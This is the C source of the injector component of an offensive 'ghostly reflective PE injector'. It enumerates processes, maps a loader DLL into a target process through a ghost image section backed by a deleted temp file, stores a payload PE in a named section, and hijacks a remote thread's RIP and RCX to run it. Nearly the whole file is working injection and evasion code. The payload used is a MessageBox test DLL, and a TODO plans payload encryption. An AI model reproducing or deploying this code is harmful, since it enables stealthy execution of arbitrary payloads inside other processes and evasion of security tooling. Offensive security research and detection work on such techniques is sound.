#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <Memoryapi.h>
#include "utils.h"

/*
-------------------------------------------------------------------------------------------------------
GHOSTLY REFLECTIVE PE INJECTOR
Author: @realCaptainWoof

This project is divided into an Injector and Loader. Injector is what injects Loader DLL into target process, and creates a new thread to invoke its exported function Load(). Further, Injector creates a named section and writes Target PE (dll, exe, etc) to it.

Load() in Loader DLL then reads from the named section, maps it to the current process (i.e, the target process, because Loader DLL is operating in Target process), loads it, and executes its entrypoint.

To help in debugging, TestDLL and TestEXE work as Target PEs. Inject either to see it in action. It pops a Messagebox.
Further, TestTargetProcess runs indefinitely allowing Injector to work with it. In Startup projects, select both this and Injector, making sure Injector starts after TestTargetProcess.
*/

/*
-------------------------------------------------------------------------------------------------------
Function to get all processes

ppSystemProcessInformation must be freed manually
*/
void GetProcessAll(IN PWINFUNC pWinFunc, OUT ULONG* pProcessInformationSizeWritten, OUT SYSTEM_PROCESS_INFORMATION** ppSystemProcessInformation)
{
	// Initialise variables
	ULONG processInformationSizeReqd = 0;
	*pProcessInformationSizeWritten = 0;
	*ppSystemProcessInformation = NULL;
	HMODULE hNtdll = NULL;

	// Get buffer size required
	NTSTATUS stats = pWinFunc->pNTQuerySystemInformation(
		SystemProcessInformation,
		NULL,
		0,
		&processInformationSizeReqd);
	if (processInformationSizeReqd == 0)
		return;

	// Allocate buffer
	*ppSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		processInformationSizeReqd
	);
	if (*ppSystemProcessInformation == NULL)
		return;

	// Get processes
	stats = pWinFunc->pNTQuerySystemInformation(
		SystemProcessInformation,
		*ppSystemProcessInformation,
		processInformationSizeReqd,
		pProcessInformationSizeWritten);
	if (stats != 0)
	{
		if (*ppSystemProcessInformation != NULL)
		{
			HeapFree(
				GetProcessHeap(),
				0,
				*ppSystemProcessInformation
			);
			*pProcessInformationSizeWritten = 0;
		}
	}
}

/*
-------------------------------------------------------------------------------------------------------
Function to search for particular process
*/
PSYSTEM_PROCESS_INFORMATION ProcessSearchWithId(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, DWORD targetProcessId)
{
	if (pSystemProcessInformation == NULL)
		return NULL;

	// In a loop, iterate through all processes, and check if it's target
	while (true)
	{
		// If process ID matches, return process
		if ((DWORD)pSystemProcessInformation->UniqueProcessId == targetProcessId)
			return pSystemProcessInformation;
		else if (pSystemProcessInformation->NextEntryOffset != 0)
			pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
		else
			break;
	}

	// If execution reaches here, it means search did not find target
	return NULL;
}

/*
-------------------------------------------------------------------------------------------------------
Function to search for particular process
*/
PSYSTEM_PROCESS_INFORMATION ProcessSearchWithName(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PWCHAR processNameToSearch)
{
	if (pSystemProcessInformation == NULL)
		return NULL;

	// In a loop, iterate through all processes, and check if it's target
	while (true)
	{
		// If process ID matches, return process
		if(pSystemProcessInformation->ImageName.Buffer != NULL && StringCompareW(pSystemProcessInformation->ImageName.Buffer, processNameToSearch))
			return pSystemProcessInformation;
		else if (pSystemProcessInformation->NextEntryOffset != 0)
			pSystemProcessInformation = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pSystemProcessInformation + pSystemProcessInformation->NextEntryOffset);
		else
			break;
	}

	// If execution reaches here, it means search did not find target
	return NULL;
}

/*
-------------------------------------------------------------------------------------------------------
Function to map loader DLL in a ghost image section in a target process
*/
bool CreateGhostImageSectionForLoaderDll(IN bool injectLocal, IN LPVOID pDllPayload, IN DWORD dllPayloadSize, IN HANDLE hTargetProcess, OUT PHANDLE phGhostSectionFileMapping, OUT VOID** ppDllPayloadInTargetBaseAddress) {
	// Initialise
	bool isSuccess = false;
	HANDLE hTempFile = NULL;
	DWORD bytesWritten = 0;
	WCHAR tempFile[MAX_PATH] = L"";
	WCHAR tempDir[MAX_PATH] = L"";

	// Create temporary file
	if (GetTempPath2W(MAX_PATH, tempDir) == 0) goto CLEANUP;
	if (GetTempFileNameW(tempDir, L"", 0, tempFile) == 0) goto CLEANUP;

	// Open handle to it
	hTempFile = CreateFileW(
		tempFile,
		GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
		NULL
	);
	if (hTempFile == NULL) goto CLEANUP;

	// Set file to be deleted
	FILE_DISPOSITION_INFO fileDispositionInfo;
	fileDispositionInfo.DeleteFileW = true;
	if (!SetFileInformationByHandle(
		hTempFile,
		FILE_INFO_BY_HANDLE_CLASS::FileDispositionInfo,
		&fileDispositionInfo,
		sizeof(FILE_DISPOSITION_INFO)
	)) goto CLEANUP;

	// Write DLL payload to the file
	WriteFile(
		hTempFile,
		pDllPayload,
		dllPayloadSize,
		&bytesWritten,
		NULL
	);
	if (bytesWritten != dllPayloadSize) goto CLEANUP;
	if (!FlushFileBuffers(hTempFile)) goto CLEANUP;

	// Create section backed by the file
	*phGhostSectionFileMapping = CreateFileMappingW(
		hTempFile,
		NULL,
		PAGE_READONLY | SEC_IMAGE,
		0,
		0,
		NULL
	);
	if (*phGhostSectionFileMapping == NULL) goto CLEANUP;

	// Close file handle
	CloseHandle(hTempFile);
	hTempFile = NULL;

	//Map Loader DLL to target process
	if(injectLocal)
		*ppDllPayloadInTargetBaseAddress = MapViewOfFile(
			*phGhostSectionFileMapping,
			FILE_MAP_READ,
			0,
			0,
			0
		);
	else
		*ppDllPayloadInTargetBaseAddress = MapViewOfFile3(
			*phGhostSectionFileMapping,
			hTargetProcess,
			NULL,
			0,
			0,
			0,
			PAGE_READONLY,
			NULL,
			0
		);

	if (*ppDllPayloadInTargetBaseAddress == NULL) goto CLEANUP;
	printf("%d bytes Loader DLL mapped to target at 0x%p with ghost section\n", dllPayloadSize, *ppDllPayloadInTargetBaseAddress);

	// If execution reaches here, all went well
	isSuccess = true;

	// Cleanup
CLEANUP:
	//// Return success status
	return isSuccess;
}

/*
---------------------------------------------------------------------------------------------------
This function converts RVA to raw data offset

pDllContents: Pointer to raw DLL contents
dataRva: RVA of the data
*/
DWORD RvaToRawDataOffset(LPVOID pDllContents, DWORD dataRva) {
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(ADD_OFFSET_TO_POINTER(pDllContents, ((PIMAGE_DOS_HEADER)pDllContents)->e_lfanew));
	PIMAGE_SECTION_HEADER pImageSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
	DWORD dataRawOffset = 0;
	for (DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i) {
		if (
			(pImageSectionHeader->VirtualAddress <= dataRva) &&
			(pImageSectionHeader->VirtualAddress + pImageSectionHeader->Misc.VirtualSize >= dataRva)
			) {
			dataRawOffset = dataRva - pImageSectionHeader->VirtualAddress + pImageSectionHeader->PointerToRawData;
			break;
		}
		++pImageSectionHeader;
	}
	return dataRawOffset;
}

/*
---------------------------------------------------------------------------------------------------
This function finds out function address offset

hModule: Module address
procName: UTF8 name of function to search
*/
DWORD GetProcAddressOffset(LPVOID pDllContents, PCHAR procName) {
	// Locate export data directory
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(ADD_OFFSET_TO_POINTER(pDllContents, ((PIMAGE_DOS_HEADER)pDllContents)->e_lfanew));
	DWORD exportDirectoryRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_EXPORT_DIRECTORY pDirectoryExport = (PIMAGE_EXPORT_DIRECTORY)(ADD_OFFSET_TO_POINTER(pDllContents, RvaToRawDataOffset(pDllContents, exportDirectoryRVA)));

	// Locate addresses of Names, NameOrdinals and Functions
	PDWORD pAddressOfNamesRVA = (PDWORD)(ADD_OFFSET_TO_POINTER(pDllContents, RvaToRawDataOffset(pDllContents, pDirectoryExport->AddressOfNames)));
	PWORD pAddressOfOrdinalsRVA = (PWORD)(ADD_OFFSET_TO_POINTER(pDllContents, RvaToRawDataOffset(pDllContents, pDirectoryExport->AddressOfNameOrdinals)));
	PDWORD pAddressOfFunctionsRVA = (PDWORD)(ADD_OFFSET_TO_POINTER(pDllContents, RvaToRawDataOffset(pDllContents, pDirectoryExport->AddressOfFunctions)));

	for (DWORD i = 0; i < (pDirectoryExport->NumberOfNames); i++) {
		PCHAR procNameCurr = (PCHAR)(ADD_OFFSET_TO_POINTER(pDllContents, RvaToRawDataOffset(pDllContents, pAddressOfNamesRVA[i])));
		if (StringCompareA(procNameCurr, procName)) {
			WORD ordinal = pAddressOfOrdinalsRVA[i];
			DWORD procRVA = pAddressOfFunctionsRVA[ordinal];
			return procRVA;
		}
	}

	return 0;
}

/*
-------------------------------------------------------------------------------------------------------
Invokes loader DLL
*/
bool InvokeLoaderDll(bool injectLocal, IN PWINFUNC pWinFunc, IN PWCHAR targetPESectionNameAddress, IN HANDLE hTargetProcess, IN DWORD targetProcessId, IN LPVOID pLoaderDllContents, IN VOID** ppDllLoaderInTargetBaseAddress) {
	// Initialisation
	ULONG processAllSize = 0;
	PSYSTEM_PROCESS_INFORMATION pProcessAll = NULL;
	PSYSTEM_PROCESS_INFORMATION pTargetProcessInfo = NULL;
	PSYSTEM_THREAD_INFORMATION pTargetThreadInfo = NULL;
	HANDLE hTargetThread = NULL;
	PIMAGE_NT_HEADERS pNtHeader = NULL;
	LPVOID dllLoaderInTargetAddressOfLoadFunction = NULL;
	bool isSuccess = false;

	// Find DLL loader's Load function offset
	dllLoaderInTargetAddressOfLoadFunction = ADD_OFFSET_TO_POINTER(*ppDllLoaderInTargetBaseAddress, GetProcAddressOffset(pLoaderDllContents, (PCHAR)"Load"));
	if (dllLoaderInTargetAddressOfLoadFunction == NULL) return false;

	/*
	Execute Loader DLL's Load() function

	For injecting locally, create new local thread
	For injecting remotely, hijack remote process's worker thread
	*/
	if (injectLocal) {
		DWORD threadId = NULL;
		hTargetThread = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)dllLoaderInTargetAddressOfLoadFunction,
			NULL,
			CREATE_SUSPENDED,
			&threadId
		);
		if (hTargetThread == NULL) goto CLEANUP;
		printf("Local thread %d created for Target DLL execution, start address: 0x%p\n", threadId, dllLoaderInTargetAddressOfLoadFunction);
	}
	else {
		DWORD threadId = NULL;
		hTargetThread = CreateRemoteThread(
			hTargetProcess,
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)dllLoaderInTargetAddressOfLoadFunction,
			NULL,
			CREATE_SUSPENDED,
			&threadId
		);
		if (hTargetThread == NULL) goto CLEANUP;
		printf("Remote thread %d created for Target DLL execution, start address: 0x%p\n", threadId, dllLoaderInTargetAddressOfLoadFunction);
	}
	if (hTargetThread == NULL) goto CLEANUP;

	// Get target thread context
	CONTEXT targetThreadContext;
	RtlZeroMemory(&targetThreadContext, sizeof(CONTEXT));
	targetThreadContext.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(hTargetThread, &targetThreadContext)) goto CLEANUP;

	// Patch target thread's RIP to point to Entry point
	targetThreadContext.Rip = (DWORD64)dllLoaderInTargetAddressOfLoadFunction;
	targetThreadContext.Rcx = (DWORD64)targetPESectionNameAddress;
	if (!SetThreadContext(hTargetThread, &targetThreadContext)) goto CLEANUP;
	printf("Target thread's RIP set to 0x%p (start address)\n", dllLoaderInTargetAddressOfLoadFunction);
	printf("Target thread's RCX set to 0x%p (first param; address of section name for Target DLL)\n", targetPESectionNameAddress);

	// Resume process
	if (ResumeThread(hTargetThread) == -1) goto CLEANUP;
	printf("Target thread resumed\n");

	// Wait for target thread to finish
	printf("Waiting for target thread to finish\n");
	WaitForSingleObject(hTargetThread, INFINITE);
	printf("Target thread finished\n");

	isSuccess = true;

CLEANUP:
	if (!injectLocal && pProcessAll != NULL)
		HeapFree(GetProcessHeap(), 0, pProcessAll);

	if (hTargetThread != NULL) CloseHandle(hTargetThread);

	return isSuccess;
}

/*
-------------------------------------------------------------------------------------------------------
Function to get content from local file
*/
DWORD ReadLocalFile(IN PCHAR filePath, OUT VOID **ppFileContents, OUT PDWORD pFileSizeHigh, OUT PDWORD pFileSizeLow) {
	HANDLE hFile = CreateFileA(
		filePath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hFile == NULL) return GetLastError();

	*pFileSizeLow = GetFileSize(hFile, pFileSizeHigh);
	LARGE_INTEGER fileSizeLargeInteger{};
	fileSizeLargeInteger.LowPart = *pFileSizeLow;
	fileSizeLargeInteger.HighPart = *pFileSizeHigh;

	*ppFileContents = HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		fileSizeLargeInteger.QuadPart
	);
	if (*ppFileContents == NULL) return GetLastError();

	DWORD dllPayloadBytesRead = 0;
	if (!ReadFile(hFile, *ppFileContents, fileSizeLargeInteger.LowPart, &dllPayloadBytesRead, NULL)) return GetLastError();
	if (dllPayloadBytesRead != fileSizeLargeInteger.LowPart) return GetLastError();

	CloseHandle(hFile);
	return 0;
}

/*
-------------------------------------------------------------------------------------------------------
Function to create a named section for Target PE
*/
void CreateNamedSectionForTargetPE(bool injectLocal, IN PWINFUNC pWinFunc, IN LPVOID pDllContents, IN DWORD dllContentsSize, IN PHANDLE phFileMapping, IN OUT PWCHAR targetPESectionName, IN HANDLE hTargetProcess) {
	// Initialise
	bool isSuccess = false;
	LPVOID pDllContentsLocalMapped = NULL;
	ULONG objectNameLen = 0;
	POBJECT_NAME_INFORMATION pObjectNameInfo = NULL;

	// Create section backed by system page memory
	SECURITY_ATTRIBUTES fileMappingSecurityAttr{};
	fileMappingSecurityAttr.bInheritHandle = TRUE;
	fileMappingSecurityAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	*phFileMapping = CreateFileMappingW(
		INVALID_HANDLE_VALUE,
		&fileMappingSecurityAttr,
		PAGE_READWRITE,
		0,
		dllContentsSize,
		targetPESectionName
	);
	if (*phFileMapping == NULL) goto CLEANUP;

	// Update section name to fully qualified
	pWinFunc->pNTQueryObject( // It will fail first time because objectNameLen is 0
		*phFileMapping,
		(OBJECT_INFORMATION_CLASS)OBJECT_NAME_INFORMATION_CLASS,
		pObjectNameInfo,
		0,
		&objectNameLen
	);
	if (objectNameLen != 0) {
		pObjectNameInfo = (POBJECT_NAME_INFORMATION)(HeapAlloc(
			GetProcessHeap(),
			HEAP_ZERO_MEMORY,
			objectNameLen
		));
		if (pObjectNameInfo != NULL) {
			pWinFunc->pNTQueryObject(
				*phFileMapping,
				(OBJECT_INFORMATION_CLASS)OBJECT_NAME_INFORMATION_CLASS,
				pObjectNameInfo,
				objectNameLen,
				&objectNameLen
			);

			if (pObjectNameInfo->Name.Buffer != NULL) {
				CopyBuffer((PBYTE)targetPESectionName, (PBYTE)(pObjectNameInfo->Name.Buffer), (pObjectNameInfo->Name.MaximumLength));
			}
		}
	}
	wprintf(L"Named section created for Target DLL: \"%s\"\n", targetPESectionName);

	// Map section to current process and write DLL contents to it
	pDllContentsLocalMapped = MapViewOfFile(
		*phFileMapping,
		FILE_MAP_READ | FILE_MAP_WRITE,
		0,
		0,
		0
	);
	if (pDllContentsLocalMapped == NULL) goto CLEANUP;
	CopyBuffer((PBYTE)pDllContentsLocalMapped, (PBYTE)pDllContents, dllContentsSize); // TODO encrypt DLL contents
	printf("%d bytes target DLL payload written to named section (local mapped 0x%p)\n", dllContentsSize, pDllContentsLocalMapped);

	// Cleanup
CLEANUP:
	if (pDllContentsLocalMapped != NULL)
		UnmapViewOfFile(pDllContentsLocalMapped);

	if (pObjectNameInfo != NULL)
		HeapFree(GetProcessHeap(), 0, pObjectNameInfo);
}

/*
-------------------------------------------------------------------------------------------------------
Function to map the name of the named section (containg target PE payload) to Target process
*/
bool InjectSectionNameForTargetPEContentsInTargetProcess(bool injectLocal, IN HANDLE hTargetProcess, IN PWCHAR targetPESectionName, OUT PHANDLE phDllContentsSectionNameMappingTarget, OUT VOID **ppDllContentsSectionNameTarget) {
	// Create file mapping object
	DWORD targetPESectionNameSize = (StringLenW(targetPESectionName) + 1) * sizeof(WCHAR);
	*phDllContentsSectionNameMappingTarget = CreateFileMappingW(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_READWRITE | SEC_COMMIT,
		0,
		targetPESectionNameSize,
		NULL
	);
	if (*phDllContentsSectionNameMappingTarget == NULL) return false;

	// Map view to local process and write the section name
	LPVOID targetPESectionNameLocal = MapViewOfFile(
		*phDllContentsSectionNameMappingTarget,
		FILE_MAP_WRITE,
		0,
		0,
		0
	);
	if (targetPESectionNameLocal == NULL) return false;
	CopyBuffer((PBYTE)targetPESectionNameLocal, (PBYTE)targetPESectionName, targetPESectionNameSize);

	//Map section to target process
	if (injectLocal)
		*ppDllContentsSectionNameTarget = targetPESectionNameLocal;
	else
		*ppDllContentsSectionNameTarget = MapViewOfFile3(
			*phDllContentsSectionNameMappingTarget,
			hTargetProcess,
			NULL,
			0,
			0,
			0,
			PAGE_READWRITE,
			NULL,
			0
		);

	if (*ppDllContentsSectionNameTarget == NULL) return false;
	printf("DLL contents section name mapped to target 0x%p\n", *ppDllContentsSectionNameTarget);
	return true;
}

/*
-------------------------------------------------------------------------------------------------------
Function to inject and invoke Loader DLL in Target process
*/
bool InjectAndInvokeLoaderDLL(IN bool injectLocal, IN PWINFUNC pWinFunc, IN PWCHAR targetPESectionName, IN LPVOID pLoaderDllContents, IN DWORD loaderDllContentsSize, IN HANDLE hTargetProcess, IN DWORD targetProcessId, OUT PHANDLE phGhostSectionFileMapping, OUT VOID **ppDllLoaderInTargetBaseAddress, OUT PHANDLE phDllContentsSectionNameMappingTarget, OUT VOID **ppDllContentsSectionNameTarget) {
	// Create ghost section containing DLL payload and map to target process
	CreateGhostImageSectionForLoaderDll(
		injectLocal,
		pLoaderDllContents,
		loaderDllContentsSize,
		hTargetProcess,
		phGhostSectionFileMapping,
		ppDllLoaderInTargetBaseAddress
	);
	if (*ppDllLoaderInTargetBaseAddress == NULL) return false;

	// Map target DLL section name to target process
	if(!InjectSectionNameForTargetPEContentsInTargetProcess(
		injectLocal,
		hTargetProcess,
		targetPESectionName,
		phDllContentsSectionNameMappingTarget,
		ppDllContentsSectionNameTarget
	)) return false;

	// Invoke DLL loader
	if (!InvokeLoaderDll(
		injectLocal,
		pWinFunc,
		(PWCHAR)(*ppDllContentsSectionNameTarget),
		hTargetProcess,
		targetProcessId,
		pLoaderDllContents,
		ppDllLoaderInTargetBaseAddress
	)) return false;

	// If execution reaches here, all went well
	return true;
}

/*
-------------------------------------------------------------------------------------------------------
MAIN FUNCTION
*/
void main()
{
	// Configurable params - CHANGE THESE AS NEEDED
	bool injectLocal = false;
	WCHAR targetPESectionName[100] = L"CAPTAINWOOF";
	DWORD targetProcessId = 0; // set to anything for debug

	// Initialisation
	LPVOID pLoaderDllContents = NULL, pTargetDllContents = NULL;
	DWORD loaderDllFileSizeLow = 0, loaderDllFileSizeHigh = 0, targetDllFileSizeLow = 0, targetDllFileSizeHigh = 0;
	HANDLE hTargetProcess = NULL;
	LPVOID pDllContentsTargetMapped = NULL;
	HANDLE hTargetDllContentsFileMapping = NULL;
	HANDLE hLoaderGhostSectionFileMapping = NULL;
	LPVOID pDllLoaderInTargetBaseAddress = NULL;
	HANDLE hDllContentsSectionNameMappingTarget = NULL;
	LPVOID pDllContentsSectionNameTarget = NULL;
	WINFUNC winFunc{};
	HMODULE hNtdll = NULL;
#ifdef _DEBUG
	ULONG processInfoSizeWrittenDEBUG = 0;
	PSYSTEM_PROCESS_INFORMATION pSystemProcessInfoDEBUG = NULL;
	PSYSTEM_PROCESS_INFORMATION pSystemProcessInfoTargetDEBUG = NULL;
#endif

	// Get needed DLLs' contents; for sake of simplicity they are read from local disk
	ReadLocalFile((PCHAR)"Loader.dll", &pLoaderDllContents, &loaderDllFileSizeHigh, &loaderDllFileSizeLow);
	ReadLocalFile((PCHAR)"TestDLL.dll", &pTargetDllContents, &targetDllFileSizeHigh, &targetDllFileSizeLow);
	if (pLoaderDllContents == NULL || pTargetDllContents == NULL) goto CLEANUP;

	// Resolve necessary functions
	hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (hNtdll == NULL) goto CLEANUP;
	winFunc.pNTQuerySystemInformation = (NTQuerySystemInformation*)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	winFunc.pNTQueryObject = (NTQueryObject*)GetProcAddress(hNtdll, "NtQueryObject");

	/*
	* In debug mode, over target process with TestTargetProcess.exe
	*/
#ifdef _DEBUG
	GetProcessAll(&winFunc, &processInfoSizeWrittenDEBUG, &pSystemProcessInfoDEBUG);
	if (pSystemProcessInfoDEBUG == NULL) goto CLEANUP;
	pSystemProcessInfoTargetDEBUG = ProcessSearchWithName(pSystemProcessInfoDEBUG, (PWCHAR)L"TestTargetProcess.exe");
	if (pSystemProcessInfoTargetDEBUG == NULL) goto CLEANUP;
	targetProcessId = (DWORD)(pSystemProcessInfoTargetDEBUG->UniqueProcessId);
	printf("Target process overriden to %d (TestTargetProcess.exe) for debug\n", targetProcessId);
#endif

	// Open handle to target process
	if (!injectLocal) {
		hTargetProcess = OpenProcess(
			PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
			false,
			targetProcessId
		);
		if (hTargetProcess == NULL || hTargetProcess == INVALID_HANDLE_VALUE) goto CLEANUP;
	}

	// Inject target DLL contents
	hTargetDllContentsFileMapping = NULL;
	CreateNamedSectionForTargetPE(
		injectLocal,
		&winFunc,
		pTargetDllContents,
		targetDllFileSizeLow,
		&hTargetDllContentsFileMapping,
		targetPESectionName,
		hTargetProcess
	);
	if (hTargetDllContentsFileMapping == NULL) goto CLEANUP;

	// Inject Loader DLL contents and invoke it
	InjectAndInvokeLoaderDLL(
		injectLocal,
		&winFunc,
		targetPESectionName,
		pLoaderDllContents,
		loaderDllFileSizeLow,
		hTargetProcess,
		targetProcessId,
		&hLoaderGhostSectionFileMapping,
		&pDllLoaderInTargetBaseAddress,
		&hDllContentsSectionNameMappingTarget,
		&pDllContentsSectionNameTarget
	);

	// Cleanup
CLEANUP:
	if (hTargetProcess != NULL)
		CloseHandle(hTargetProcess);

	if (hTargetDllContentsFileMapping != NULL)
		CloseHandle(hTargetDllContentsFileMapping);

	if (hLoaderGhostSectionFileMapping != NULL)
		CloseHandle(hLoaderGhostSectionFileMapping);

	if (hDllContentsSectionNameMappingTarget != NULL)
		CloseHandle(hDllContentsSectionNameMappingTarget);

	if (pLoaderDllContents != NULL)
		HeapFree(GetProcessHeap(), 0, pLoaderDllContents);

	if (pTargetDllContents != NULL)
		HeapFree(GetProcessHeap(), 0, pTargetDllContents);

#ifdef _DEBUG
	if (pSystemProcessInfoDEBUG != NULL)
		HeapFree(GetProcessHeap(), 0, pSystemProcessInfoDEBUG);
#endif
}
